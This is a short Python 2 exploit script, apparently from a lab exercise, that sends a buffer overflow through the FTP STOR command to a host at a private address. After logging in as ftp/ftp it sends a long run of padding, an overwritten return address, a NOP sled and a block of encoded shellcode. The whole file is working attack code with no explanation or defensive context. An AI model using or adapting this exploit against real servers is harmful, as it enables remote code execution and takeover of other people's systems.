#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xda\xd9\xd9\x74\x24\xf4\xbb\x49\x4f\x85\xae\x5a\x31\xc9\xb1"
"\x52\x31\x5a\x17\x83\xc2\x04\x03\x13\x5c\x67\x5b\x5f\x8a\xe5"
"\xa4\x9f\x4b\x8a\x2d\x7a\x7a\x8a\x4a\x0f\x2d\x3a\x18\x5d\xc2"
"\xb1\x4c\x75\x51\xb7\x58\x7a\xd2\x72\xbf\xb5\xe3\x2f\x83\xd4"
"\x67\x32\xd0\x36\x59\xfd\x25\x37\x9e\xe0\xc4\x65\x77\x6e\x7a"
"\x99\xfc\x3a\x47\x12\x4e\xaa\xcf\xc7\x07\xcd\xfe\x56\x13\x94"
"\x20\x59\xf0\xac\x68\x41\x15\x88\x23\xfa\xed\x66\xb2\x2a\x3c"
"\x86\x19\x13\xf0\x75\x63\x54\x37\x66\x16\xac\x4b\x1b\x21\x6b"
"\x31\xc7\xa4\x6f\x91\x8c\x1f\x4b\x23\x40\xf9\x18\x2f\x2d\x8d"
"\x46\x2c\xb0\x42\xfd\x48\x39\x65\xd1\xd8\x79\x42\xf5\x81\xda"
"\xeb\xac\x6f\x8c\x14\xae\xcf\x71\xb1\xa5\xe2\x66\xc8\xe4\x6a"
"\x4a\xe1\x16\x6b\xc4\x72\x65\x59\x4b\x29\xe1\xd1\x04\xf7\xf6"
"\x16\x3f\x4f\x68\xe9\xc0\xb0\xa1\x2e\x94\xe0\xd9\x87\x95\x6a"
"\x19\x27\x40\x3c\x49\x87\x3b\xfd\x39\x67\xec\x95\x53\x68\xd3"
"\x86\x5c\xa2\x7c\x2c\xa7\x25\x2f\xa1\xee\x35\x47\xc0\xf0\x24"
"\xc4\x4d\x16\x2c\xe4\x1b\x81\xd9\x9d\x01\x59\x7b\x61\x9c\x24"
"\xbb\xe9\x13\xd9\x72\x1a\x59\xc9\xe3\xea\x14\xb3\xa2\xf5\x82"
"\xdb\x29\x67\x49\x1b\x27\x94\xc6\x4c\x60\x6a\x1f\x18\x9c\xd5"
"\x89\x3e\x5d\x83\xf2\xfa\xba\x70\xfc\x03\x4e\xcc\xda\x13\x96"
"\xcd\x66\x47\x46\x98\x30\x31\x20\x72\xf3\xeb\xfa\x29\x5d\x7b"
"\x7a\x02\x5e\xfd\x83\x4f\x28\xe1\x32\x26\x6d\x1e\xfa\xae\x79"
"\x67\xe6\x4e\x85\xb2\xa2\x7f\xcc\x9e\x83\x17\x89\x4b\x96\x75"
"\x2a\xa6\xd5\x83\xa9\x42\xa6\x77\xb1\x27\xa3\x3c\x75\xd4\xd9"
"\x2d\x10\xda\x4e\x4d\x31")

buffer = "A" *966 + "\x0a\xaf\xd8\x77"  + "\x90"*50 + shellcode + "\x90"*600

print "\nSending evil buffer..."
s.connect(('172.16.73.129',21))
data = s.recv(1023)
s.send('USER ftp\r\n')
data = s.recv(1024)
s.send('PASS ftp\r\n')
data = s.recv(1024)
s.send('STOR ' + buffer + '\r\n')
s.close()
